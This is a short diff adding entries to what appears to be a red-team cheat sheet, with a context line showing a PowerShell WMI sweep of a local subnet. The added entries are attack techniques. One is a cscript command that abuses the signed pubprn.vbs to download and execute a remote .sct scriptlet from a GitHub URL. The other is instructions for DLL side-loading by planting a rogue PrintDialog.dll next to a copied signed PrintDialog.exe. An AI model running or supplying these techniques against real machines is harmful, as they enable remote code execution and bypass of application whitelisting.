@@ -86,3 +86,15 @@ for($i=1;$i -lt 255;$i++){Write-Host ("[*] 192.168.1." + $i); Get-WmiObject -cla
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.sct
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Windows\PrintDialog\PrintDialog.exe 
+(or)
+C:\Windows\System32\PrintDialogHost.exe
+
+uses LoadLibrary to load PrintDialog.dll, so if you copy it to a different folder and drop your own PrintDialog.dll there you will be able to load it via a signed .exe once you execute PrintDialog.exe
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
